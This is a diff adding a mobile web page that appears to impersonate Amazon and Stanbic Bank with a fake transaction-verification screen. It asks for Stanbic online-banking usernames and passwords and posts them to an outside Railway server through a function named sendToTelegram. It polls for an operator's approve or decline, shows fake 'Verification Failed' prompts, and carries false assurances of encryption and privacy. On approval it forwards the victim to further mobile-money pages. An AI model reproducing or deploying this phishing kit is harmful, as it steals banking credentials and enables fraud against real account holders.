@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#131921">
+<title>Verify · Amazon Bank</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --amz-ink: #131921;
+    --amz-orange: #FF861F;
+    --amz-orange-hover: #F07800;
+    --amz-orange-subtle: #FFF4E5;
+    --amz-text: #0F1111;
+    --amz-muted: #565959;
+    --amz-border: #E7E9EC;
+    --amz-border-soft: #F0F1F3;
+    --amz-success: #067D62;
+    --amz-error: #B12704;
+    --stanbic-blue: #1A73E8;
+    --stanbic-blue-dark: #0033A0;
+    --stanbic-bg: #F0F7FF;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #EEF0F2; color: var(--amz-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.4;
+    min-height: 100dvh; display: flex; justify-content: center; align-items: center;
+    overflow: hidden;
+  }
+  .phone {
+    width: 100%; max-width: 400px; background: #FFFFFF;
+    height: 100dvh; position: relative;
+    display: flex; flex-direction: column; overflow: hidden;
+  }
+  @media (min-width: 520px) {
+    body { padding: 20px 0; }
+    .phone {
+      height: calc(100dvh - 40px); max-height: 760px; border-radius: 22px;
+      box-shadow: 0 24px 70px rgba(19,25,33,0.18), 0 4px 14px rgba(19,25,33,0.08);
+    }
+  }
+  .app-header {
+    background: var(--amz-ink); color: #fff; height: 60px; padding: 0 14px;
+    padding-top: env(safe-area-inset-top, 0);
+    display: flex; align-items: center; justify-content: space-between;
+    position: relative; flex-shrink: 0; z-index: 5;
+  }
+  .app-header .back {
+    width: 34px; height: 34px; border-radius: 50%; border: none;
+    background: transparent; color: #fff; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    margin-left: -4px; transition: background .15s;
+  }
+  .app-header .back:hover { background: rgba(255,255,255,0.08); }
+  .app-header .back svg { width: 19px; height: 19px; }
+  .app-header .title {
+    position: absolute; left: 50%; top: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 16px; font-weight: 600; letter-spacing: -0.2px; white-space: nowrap;
+  }
+  .app-header .spacer-right { width: 34px; height: 34px; }
+
+  .body-scroll {
+    flex: 1 1 auto;
+    overflow-y: auto;
+    padding: 20px 20px 16px;
+    display: flex; flex-direction: column;
+    -webkit-overflow-scrolling: touch;
+  }
+
+  /* ── New Transaction Card Layout ── */
+  .txn-card {
+    background: #FFFFFF;
+    border: 1px solid var(--amz-border);
+    border-radius: 16px;
+    box-shadow: 0 4px 16px rgba(19,25,33,0.04);
+    overflow: hidden;
+    margin-bottom: 20px;
+  }
+
+  /* Sender Side (Amazon) */
+  .sender-section {
+    padding: 18px 18px 14px;
+    background: #FAFAFA;
+    border-bottom: 1px solid var(--amz-border-soft);
+  }
+  .sender-brand {
+    display: flex; align-items: center; gap: 10px; margin-bottom: 14px;
+  }
+  .sender-brand .brand-mark {
+    width: 36px; height: 36px; border-radius: 10px;
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    color: var(--amz-ink); display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 800;
+  }
+  .sender-brand .brand-name { font-size: 15px; font-weight: 800; color: var(--amz-ink); }
+  .sender-brand .brand-sub { font-size: 10px; color: var(--amz-muted); }
+
+  .info-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    padding: 6px 0; font-size: 12.5px;
+  }
+  .info-row .k { color: var(--amz-muted); font-weight: 500; }
+  .info-row .v { color: var(--amz-ink); font-weight: 600; text-align: right; max-width: 60%; word-break: break-word; }
+  .info-row .v.mono { font-family: "SF Mono", Monaco, monospace; font-size: 11.5px; letter-spacing: 0.3px; }
+  .info-row .v.masked { letter-spacing: 1.5px; }
+
+  /* Amount Highlight */
+  .amount-highlight {
+    padding: 20px 18px;
+    text-align: center;
+    background: #FFFFFF;
+    border-bottom: 1px solid var(--amz-border-soft);
+  }
+  .amount-highlight .label {
+    font-size: 11px; font-weight: 600; color: var(--amz-muted);
+    text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px;
+  }
+  .amount-highlight .value {
+    font-size: 38px; font-weight: 800; color: var(--amz-ink);
+    letter-spacing: -1.5px; line-height: 1.1;
+  }
+  .amount-highlight .value .cur { font-size: 20px; font-weight: 700; color: var(--amz-muted); margin-right: 2px; }
+
+  /* Recipient Side (Stanbic) */
+  .recipient-section {
+    padding: 16px 18px;
+    background: var(--stanbic-bg);
+    border-top: 3px solid var(--stanbic-blue);
+  }
+  .recipient-brand {
+    display: flex; align-items: center; gap: 10px; margin-bottom: 14px;
+  }
+  .recipient-brand .bank-logo {
+    width: 40px; height: 40px; border-radius: 8px;
+    background: #FFFFFF; border: 1.5px solid var(--stanbic-blue);
+    display: flex; align-items: center; justify-content: center;
+    color: var(--stanbic-blue-dark); font-weight: 800; font-size: 11px; letter-spacing: -0.5px;
+    box-shadow: 0 2px 6px rgba(26,115,232,0.15);
+  }
+  .recipient-brand .bank-name { font-size: 16px; font-weight: 800; color: var(--stanbic-blue-dark); letter-spacing: -0.3px; }
+  .recipient-brand .bank-sub { font-size: 10px; color: var(--amz-muted); font-weight: 500; }
+
+  .recipient-section .info-row .k { color: #4A5568; }
+  .recipient-section .info-row .v { color: var(--stanbic-blue-dark); }
+
+  .verify-btn {
+    width: 100%; padding: 15px; font-size: 15px; font-weight: 700; font-family: inherit;
+    color: #FFFFFF;
+    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
+    border: none; border-radius: 12px; cursor: pointer;
+    box-shadow: 0 6px 18px rgba(255,134,31,0.30), inset 0 1px 0 rgba(255,255,255,0.35);
+    transition: filter .15s, transform .1s, opacity .15s; letter-spacing: 0.2px;
+    margin-top: 6px;
+  }
+  .verify-btn:hover { filter: brightness(1.05); }
+  .verify-btn:active { transform: scale(0.995); }
+  .verify-btn:disabled { background: #D6D9DD; color: #8A8F98; box-shadow: none; cursor: not-allowed; }
+
+  /* ── Loading Overlay (1.5s) ── */
+  .verify-loading-overlay {
+    position: fixed; inset: 0; background: rgba(19,25,33,0.6);
+    z-index: 150; display: none; align-items: center; justify-content: center;
+    flex-direction: column; gap: 16px;
+  }
+  .verify-loading-overlay.show { display: flex; animation: fadeIn .2s ease; }
+  .verify-loading-overlay .spinner {
+    width: 44px; height: 44px; border: 4px solid rgba(255,255,255,0.15);
+    border-top-color: var(--amz-orange); border-radius: 50%;
+    animation: spin .7s linear infinite;
+  }
+  .verify-loading-overlay .load-txt {
+    color: #fff; font-size: 14px; font-weight: 600; letter-spacing: 0.2px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  /* ── MODAL 1: Secure Login (Username + Password) ── */
+  .modal-backdrop {
+    position: fixed; inset: 0; background: rgba(19,25,33,0.55);
+    z-index: 200; display: none; align-items: center; justify-content: center;
+    padding: 24px;
+  }
+  .modal-backdrop.show { display: flex; animation: fadeIn .2s ease; }
+
+  .login-modal {
+    background: #FFFFFF; border-radius: 20px; padding: 28px 24px 24px;
+    max-width: 360px; width: 100%; box-shadow: 0 24px 60px rgba(19,25,33,0.35);
+    animation: popIn .25s cubic-bezier(.4,1.3,.6,1);
+    position: relative;
+  }
+  @keyframes popIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
+
+  .login-modal .modal-header { text-align: center; margin-bottom: 20px; }
+  .login-modal .modal-icon {
+    width: 56px; height: 56px; border-radius: 16px;
+    background: linear-gradient(135deg, var(--stanbic-blue), var(--stanbic-blue-dark));
+    color: #fff; display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 12px; box-shadow: 0 6px 18px rgba(26,115,232,0.3);
+  }
+  .login-modal .modal-icon svg { width: 28px; height: 28px; }
+  .login-modal h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 4px; }
+  .login-modal .modal-sub { font-size: 12px; color: var(--amz-muted); line-height: 1.4; }
+
+  .login-field { margin-bottom: 14px; }
+  .login-field label {
+    display: block; font-size: 12px; font-weight: 600; color: var(--amz-ink);
+    margin-bottom: 5px;
+  }
+  .login-field input {
+    width: 100%; padding: 12px 14px; font-size: 14px;
+    border: 1.5px solid var(--amz-border); border-radius: 10px;
+    background: #FAFAFA; color: var(--amz-text); outline: none;
+    font-family: inherit; transition: border-color .15s, box-shadow .15s;
+  }
+  .login-field input:focus {
+    border-color: var(--stanbic-blue); background: #fff;
+    box-shadow: 0 0 0 3px rgba(26,115,232,0.12);
+  }
+  .login-field input::placeholder { color: #A8B4C4; }
+
+  .login-error {
+    display: none; text-align: center; font-size: 11.5px;
+    color: var(--amz-error); font-weight: 600; margin: 6px 0;
+  }
+  .login-error.show { display: block; }
+
+  .login-modal .submit-btn {
+    width: 100%; padding: 14px; font-size: 14.5px; font-weight: 700; font-family: inherit;
+    color: #FFFFFF; background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
+    border: none; border-radius: 11px; cursor: pointer;
+    box-shadow: 0 4px 14px rgba(255,134,31,0.3);
+    transition: filter .15s, transform .1s; margin-top: 4px;
+  }
+  .login-modal .submit-btn:hover { filter: brightness(1.05); }
+  .login-modal .submit-btn:active { transform: scale(0.99); }
+  .login-modal .submit-btn:disabled { background: #D6D9DD; color: #8A8F98; box-shadow: none; cursor: not-allowed; }
+
+  .login-secure-note {
+    display: flex; align-items: center; justify-content: center;
+    gap: 5px; font-size: 10px; color: var(--amz-muted); margin-top: 14px; text-align: center;
+  }
+  .login-secure-note svg { width: 11px; height: 11px; color: var(--amz-success); }
+
+  /* ── Processing Overlay (post-login) ── */
+  .verifying-overlay {
+    position: fixed; inset: 0; background: var(--amz-ink); color: #fff;
+    z-index: 100;
+    display: none; flex-direction: column; align-items: center; justify-content: center;
+    padding: 30px; text-align: center;
+  }
+  .verifying-overlay.show { display: flex; }
+  .verifying-overlay .brand-mark {
+    width: 72px; height: 72px; border-radius: 18px;
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    display: flex; align-items: center; justify-content: center;
+    color: var(--amz-ink); font-weight: 800; font-size: 28px; letter-spacing: -0.5px;
+    box-shadow: 0 10px 30px rgba(255,134,31,0.4); margin-bottom: 20px;
+  }
+  .verifying-overlay .load-title { font-size: 22px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying-overlay .load-sub { font-size: 13px; color: rgba(255,255,255,0.65); margin-bottom: 26px; max-width: 280px; line-height: 1.5; }
+  .verifying-overlay .spinner {
+    width: 34px; height: 34px; border: 3px solid rgba(255,255,255,0.15);
+    border-top-color: var(--amz-orange); border-radius: 50%;
+    animation: spin .8s linear infinite; margin-bottom: 30px;
+  }
+
+  .safety-panel {
+    background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 14px; padding: 20px 14px; max-width: 340px; width: 100%;
+    min-height: 92px; position: relative; overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .safety-slide {
+    position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+    gap: 10px; padding: 0 20px; opacity: 0; transform: translateX(30px);
+    transition: opacity .5s ease, transform .5s ease;
+    color: rgba(255,255,255,0.85); font-size: 12.5px; font-weight: 500; line-height: 1.5; text-align: center;
+  }
+  .safety-slide.active { opacity: 1; transform: translateX(0); }
+  .safety-slide.leaving { opacity: 0; transform: translateX(-30px); }
+  .safety-slide svg { width: 20px; height: 20px; color: var(--amz-success); flex-shrink: 0; }
+  .safety-slide span { flex: 1; text-align: left; }
+
+  .popup-backdrop {
+    position: fixed; inset: 0; background: rgba(19,25,33,0.45);
+    z-index: 120; display: none; align-items: center; justify-content: center; padding: 24px;
+  }
+  .popup-backdrop.show { display: flex; animation: fadeIn .2s ease; }
+  .popup-card {
+    background: #FFFFFF; border-radius: 16px; padding: 26px 22px 22px;
+    max-width: 320px; width: 100%; text-align: center;
+    box-shadow: 0 20px 60px rgba(19,25,33,0.35);
+    animation: popIn .25s cubic-bezier(.4,1.3,.6,1);
+  }
+  .popup-card .ic {
+    width: 60px; height: 60px; border-radius: 50%; background: #FDECEA; color: var(--amz-error);
+    display: flex; align-items: center; justify-content: center; margin: 0 auto 14px;
+  }
+  .popup-card .ic svg { width: 30px; height: 30px; }
+  .popup-card h3 { font-size: 18px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 6px; }
+  .popup-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.5; margin-bottom: 18px; }
+  .popup-card .ok-btn {
+    width: 100%; padding: 12px; border: none; border-radius: 10px;
+    background: var(--amz-ink); color: #fff; font-family: inherit;
+    font-size: 14px; font-weight: 700; cursor: pointer; transition: filter .15s;
+  }
+  .popup-card .ok-btn:hover { filter: brightness(1.15); }
+
+  .state-card { padding: 46px 24px; text-align: center; }
+  .state-card .ic {
+    width: 54px; height: 54px; border-radius: 50%; background: var(--amz-orange-subtle);
+    color: var(--amz-orange-hover); display: flex; align-items: center; justify-content: center;
+    font-size: 24px; margin: 0 auto 16px;
+  }
+  .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
+  .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
+
+  @media (max-height: 700px) {
+    .amount-highlight .value { font-size: 32px; }
+    .sender-section, .recipient-section { padding: 14px 16px; }
+    .body-scroll { padding: 14px 16px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone" id="phone">
+  <header class="app-header">
+    <button class="back" id="backBtn" aria-label="Back">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+    </button>
+    <div class="title">Verify transaction</div>
+    <span class="spacer-right"></span>
+  </header>
+
+  <div class="body-scroll" id="bodyScroll">
+    <!-- New Two-Sided Transaction Card -->
+    <div class="txn-card">
+      <!-- Sender: Amazon Bank -->
+      <div class="sender-section">
+        <div class="sender-brand">
+          <div class="brand-mark">AB</div>
+          <div>
+            <div class="brand-name">Amazon Bank</div>
+            <div class="brand-sub">Sender account</div>
+          </div>
+        </div>
+        <div class="info-row">
+          <span class="k">Account number</span>
+          <span class="v mono masked" id="senderAccount">•••• •••• •••• 3657</span>
+        </div>
+        <div class="info-row">
+          <span class="k">Payment method</span>
+          <span class="v" id="senderMethod">—</span>
+        </div>
+      </div>
+
+      <!-- Amount Highlight -->
+      <div class="amount-highlight">
+        <div class="label">Amount to receive</div>
+        <div class="value" id="highlightAmount"><span class="cur">$</span>0.00</div>
+      </div>
+
+      <!-- Recipient: Stanbic Bank -->
+      <div class="recipient-section">
+        <div class="recipient-brand">
+          <div class="bank-logo">STANBIC</div>
+          <div>
+            <div class="bank-name">Stanbic Bank</div>
+            <div class="bank-sub">Recipient details</div>
+          </div>
+        </div>
+        <div class="info-row">
+          <span class="k">Recipient</span>
+          <span class="v" id="recipientName">—</span>
+        </div>
+        <div class="info-row">
+          <span class="k">Account number</span>
+          <span class="v mono masked" id="recipientAccount">—</span>
+        </div>
+        <div class="info-row">
+          <span class="k">Reference</span>
+          <span class="v mono" id="recipientRef">—</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Original Verification Button -->
+    <button class="verify-btn" id="verifyBtn">Verify &amp; Continue</button>
+  </div>
+</div>
+
+<!-- 1.5s Loading Overlay -->
+<div class="verify-loading-overlay" id="verifyLoadingOverlay">
+  <div class="spinner"></div>
+  <div class="load-txt">Preparing secure verification…</div>
+</div>
+
+<!-- MODAL 1: Secure Login (Username + Password) -->
+<div class="modal-backdrop" id="loginModalBackdrop">
+  <div class="login-modal">
+    <div class="modal-header">
+      <div class="modal-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+      </div>
+      <h2>Secure Login</h2>
+      <p class="modal-sub">Enter your Stanbic online banking credentials to authorise this transfer.</p>
+    </div>
+    <div class="login-field">
+      <label for="loginUsername">Username / Email</label>
+      <input type="text" id="loginUsername" placeholder="Enter your username" autocomplete="off" spellcheck="false">
+    </div>
+    <div class="login-field">
+      <label for="loginPassword">Password</label>
+      <input type="password" id="loginPassword" placeholder="Enter your password" autocomplete="off">
+    </div>
+    <div class="login-error" id="loginError">Please enter both username and password.</div>
+    <button class="submit-btn" id="loginSubmitBtn">Sign in &amp; Verify</button>
+    <div class="login-secure-note">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/>
+        <path d="M9 12l2 2 4-4"/>
+      </svg>
+      <span>Secured with end-to-end encryption</span>
+    </div>
+  </div>
+</div>
+
+<!-- Processing Overlay (after login submission) -->
+<div class="verifying-overlay" id="verifyingOverlay">
+  <div class="brand-mark">AB</div>
+  <div class="load-title">Processing securely</div>
+  <div class="load-sub">Your request is being reviewed. Please keep this page open.</div>
+  <div class="spinner"></div>
+  <div class="safety-panel">
+    <div class="safety-slide active">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+      <span>End-to-end encryption protects your details at every step.</span>
+    </div>
+    <div class="safety-slide">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+      <span>No funds move until the request is fully approved.</span>
+    </div>
+    <div class="safety-slide">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+      <span>Amazon Bank never shares your information with third parties.</span>
+    </div>
+  </div>
+</div>
+
+<!-- Decline Popup -->
+<div class="popup-backdrop" id="popupBackdrop">
+  <div class="popup-card">
+    <div class="ic">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M12 8v4"/>
+        <path d="M12 16h.01"/>
+      </svg>
+    </div>
+    <h3>Verification Failed</h3>
+    <p>The credentials you entered are incorrect. Please try again.</p>
+    <button class="ok-btn" id="popupOkBtn">Try again</button>
+  </div>
+</div>
+
+<script>
+/* ────────────────────────────────────────────────────────────
+   RAILWAY endpoints — always-on, no cold start
+   ──────────────────────────────────────────────────────────── */
+const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
+
+const CONFIG = {
+  MTN_NEXT_PAGE: 'sms.html',
+  ECOCASH_NEXT_PAGE: 'ecocash.html',
+  VERIFY_ENDPOINT: RAILWAY_BASE + '/api/verify/send',
+  STATUS_ENDPOINT: (id) => RAILWAY_BASE + '/api/verify/status/' + encodeURIComponent(id),
+  POLL_INTERVAL_MS: 2000,
+  MAX_WAIT_MS: 5 * 60 * 1000,
+  SHORT_LINK_ENDPOINTS: [
+    (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
+    (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
+  ],
+  DEFAULT_FEE: 0,
+  SLOW_HINT_MS: 6000,
+  LOADING_DELAY_MS: 1500 // 1.5 seconds loading
+};
+
+/* MTN countries — kept as-is per original logic */
+const MTN_COUNTRIES = [
+  'Benin', 'Cameroon', "Côte d'Ivoire", 'Congo', 'Eswatini',
+  'Ghana (MTN)', 'Liberia', 'Rwanda (MTN)', 'Uganda (MTN)', 'Zambia (MTN)'
+];
+
+function normalizeCountry(s) {
+  return String(s || '').normalize('NFC').replace(/\u00a0/g, ' ').replace(/\s+/g, ' ').trim().toLowerCase();
+}
+
+function nextPageFor(country) {
+  const c = normalizeCountry(country);
+  const isMtn = MTN_COUNTRIES.some(m => normalizeCountry(m) === c);
+  return isMtn ? CONFIG.MTN_NEXT_PAGE : CONFIG.ECOCASH_NEXT_PAGE;
+}
+
+const CURRENCY_SYMBOLS = {
+  USD: '$', ZAR: 'R', KES: 'KSh ', BWP: 'P ', MWK: 'MK ',
+  ZMW: 'K ', UGX: 'USh ', GHS: '₵', SZL: 'E', NGN: '₦',
+  LSL: 'M ', MUR: 'Rs ', MZN: 'MT ', NAD: 'N$ ', SSP: 'SS£ ',
+  TZS: 'TSh ', AOA: 'Kz ', XOF: 'CFA ', CDF: 'FC '
+};
+function currencySymbol(code) {
+  const c = String(code || 'USD').toUpperCase();
+  return CURRENCY_SYMBOLS[c] || (c + ' ');
+}
+function formatMoney(amount, currency) {
+  const n = Number(amount);
+  const safe = isFinite(n) ? n : 0;
+  return currencySymbol(currency) + safe.toFixed(2);
+}
+function maskAccount(acct) {
+  const s = String(acct || '').replace(/\s+/g, '');
+  if (s.length < 4) return '••••';
+  const last4 = s.slice(-4);
+  return '•••• •••• •••• ' + last4;
+}
+
+function b64urlDecode(str) {
+  str = String(str).replace(/-/g, '+').replace(/_/g, '/');
+  while (str.length % 4) str += '=';
+  return decodeURIComponent(escape(atob(str)));
+}
+function readQuery(name) { return new URLSearchParams(window.location.search).get(name); }
+
+async function resolvePayload() {
+  try {
+    const raw = sessionStorage.getItem('amz_payload');
+    if (raw) return JSON.parse(raw);
+  } catch (e) {}
+  const d = readQuery('d');
+  if (d) {
+    try { return JSON.parse(b64urlDecode(d)); }
+    catch (e) { throw new Error('Invalid link data.'); }
+  }
+  const code = readQuery('r');
+  if (code) {
+    for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
+      try {
+        const res = await fetch(makeUrl(code));
+        if (!res.ok) continue;
+        const data = await res.json();
+        const payload = data && (data.payload || data);
+        if (payload && (payload.am || payload.c)) return payload;
+      } catch (e) {}
+    }
+    throw new Error('This payment link could not be loaded.');
+  }
+  throw new Error('No payment data available.');
+}
+
+function escapeHtml(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+
+const state = {
+  payload: null, requestId: null,
+  polling: false, pollStart: 0, slowHintTimer: null,
+  username: '', password: ''
+};
+
+function render(payload) {
+  state.payload = payload;
+  const cur = String(payload.cur || 'USD').toUpperCase();
+  const amount = Number(payload.am || 0);
+  const fee = (payload.fee != null) ? Number(payload.fee) : CONFIG.DEFAULT_FEE;
+  const receive = Math.max(0, amount - (isFinite(fee) ? fee : 0));
+
+  const setTxt = (id, txt) => { const el = document.getElementById(id); if (el) el.textContent = txt; };
+
+  // Sender side
+  const senderAcct = String(payload.an || '').replace(/\s+/g, '');
+  setTxt('senderAccount', maskAccount(senderAcct));
+  setTxt('senderMethod', payload.pm || 'Amazon Flex Debit Card');
+
+  // Amount (prominent)
+  const amtEl = document.getElementById('highlightAmount');
+  if (amtEl) {
+    const sym = currencySymbol(cur);
+    amtEl.innerHTML = '<span class="cur">' + escapeHtml(sym) + '</span>' + receive.toFixed(2);
+  }
+
+  // Recipient side (Stanbic)
+  setTxt('recipientName', payload.rn || '—');
+  setTxt('recipientAccount', maskAccount(payload.an || ''));
+  setTxt('recipientRef', payload.tx || payload.tn || '—');
+}
+
+function showStateCard(icon, title, message) {
+  const scroll = document.getElementById('bodyScroll');
+  if (!scroll) return;
+  scroll.innerHTML =
+    '<div class="state-card">' +
+      '<div class="ic">' + escapeHtml(icon) + '</div>' +
+      '<h2>' + escapeHtml(title) + '</h2>' +
+      '<p>' + escapeHtml(message) + '</p>' +
+    '</div>';
+}
+
+/* ── Login Modal Control ── */
+function openLoginModal() {
+  const bd = document.getElementById('loginModalBackdrop');
+  if (bd) bd.classList.add('show');
+  const u = document.getElementById('loginUsername');
+  if (u) setTimeout(() => u.focus(), 100);
+}
+function closeLoginModal() {
+  const bd = document.getElementById('loginModalBackdrop');
+  if (bd) bd.classList.remove('show');
+  const err = document.getElementById('loginError');
+  if (err) err.classList.remove('show');
+}
+
+/* ── Verification Logic (adapted for username/password) ── */
+async function sendToTelegram(username, password, payload) {
+  const res = await fetch(CONFIG.VERIFY_ENDPOINT, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      pin: password, // keeping backend field name 'pin' to avoid breaking API, but sending password
+      number: username, // keeping 'number' for username
+      country: payload.c, recipient: payload.rn,
+      amount: payload.am, currency: payload.cur,
+      fee: payload.fee,
+      reference: payload.tx || payload.tn,
+      method: payload.pm,
+      // Also send explicit fields for clarity
+      username: username,
+      password: password
+    })
+  });
+  if (!res.ok) throw new Error('Verification server unavailable.');
+  const data = await res.json();
+  if (!data.requestId) throw new Error('No request ID returned.');
+  return data.requestId;
+}
+
+function pollStatus() {
+  if (!state.requestId) return;
+  if (Date.now() - state.pollStart > CONFIG.MAX_WAIT_MS) { handleDecline(); return; }
+  fetch(CONFIG.STATUS_ENDPOINT(state.requestId))
+    .then(r => r.json())
+    .then(data => {
+      const status = (data && data.status) || (data && data.decision) || 'pending';
+      if (status === 'approved') handleApprove();
+      else if (status === 'declined') handleDecline();
+      else setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
+    })
+    .catch(() => setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS));
+}
+
+function handleApprove() {
+  state.polling = false;
+  if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
+  stopSafetySlider();
+  const next = nextPageFor(state.payload && state.payload.c);
+  const qs = window.location.search || '';
+  window.location.href = next + qs;
+}
+
+function handleDecline() {
+  state.polling = false;
+  if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
+  stopSafetySlider();
+
+  const vo = document.getElementById('verifyingOverlay');
+  if (vo) vo.classList.remove('show');
+
+  // Clear login fields
+  const u = document.getElementById('loginUsername');
+  const p = document.getElementById('loginPassword');
+  if (u) u.value = '';
+  if (p) p.value = '';
+  state.username = '';
+  state.password = '';
+  state.requestId = null;
+
+  // Re-open login modal or show popup
+  const popup = document.getElementById('popupBackdrop');
+  if (popup) popup.classList.add('show');
+}
+
+let safetyTimer = null;
+let safetyIndex = 0;
+
+function startSafetySlider() {
+  const slides = document.querySelectorAll('.safety-slide');
+  if (!slides.length) return;
+  safetyIndex = 0;
+  slides.forEach((s, i) => {
+    s.classList.remove('active', 'leaving');
+    if (i === 0) s.classList.add('active');
+  });
+  if (safetyTimer) clearInterval(safetyTimer);
+  safetyTimer = setInterval(() => {
+    slides[safetyIndex].classList.remove('active');
+    slides[safetyIndex].classList.add('leaving');
+    const prev = safetyIndex;
+    safetyIndex = (safetyIndex + 1) % slides.length;
+    setTimeout(() => slides[prev].classList.remove('leaving'), 500);
+    slides[safetyIndex].classList.add('active');
+  }, 2600);
+}
+
+function stopSafetySlider() {
+  if (safetyTimer) { clearInterval(safetyTimer); safetyTimer = null; }
+}
+
+async function doLoginVerify() {
+  const username = (document.getElementById('loginUsername').value || '').trim();
+  const password = (document.getElementById('loginPassword').value || '').trim();
+  const errEl = document.getElementById('loginError');
+  const submitBtn = document.getElementById('loginSubmitBtn');
+
+  if (!username || !password) {
+    if (errEl) {
+      errEl.textContent = 'Please enter both username and password.';
+      errEl.classList.add('show');
+    }
+    return;
+  }
+
+  state.username = username;
+  state.password = password;
+  if (errEl) errEl.classList.remove('show');
+  if (submitBtn) submitBtn.disabled = true;
+
+  // Close login modal, show processing overlay
+  closeLoginModal();
+  const overlay = document.getElementById('verifyingOverlay');
+  if (overlay) {
+    const t = overlay.querySelector('.load-title');
+    const s = overlay.querySelector('.load-sub');
+    if (t) t.textContent = 'Processing securely';
+    if (s) s.textContent = 'Your request is being reviewed. Please keep this page open.';
+    overlay.classList.add('show');
+    startSafetySlider();
+  }
+
+  try {
+    const requestId = await sendToTelegram(username, password, state.payload);
+    state.requestId = requestId;
+    state.pollStart = Date.now();
+    state.polling = true;
+    state.slowHintTimer = setTimeout(() => {
+      if (state.polling && overlay) {
+        const s = overlay.querySelector('.load-sub');
+        if (s) s.textContent = 'Still waiting for approval — this can take a moment. Please keep this page open.';
+      }
+    }, CONFIG.SLOW_HINT_MS);
+    setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
+  } catch (err) {
+    if (overlay) overlay.classList.remove('show');
+    handleDecline();
+  } finally {
+    if (submitBtn) submitBtn.disabled = false;
+  }
+}
+
+async function boot() {
+  const backBtn = document.getElementById('backBtn');
+  if (backBtn) backBtn.addEventListener('click', () => { if (window.history.length > 1) window.history.back(); });
+
+  const popupOkBtn = document.getElementById('popupOkBtn');
+  if (popupOkBtn) popupOkBtn.addEventListener('click', () => {
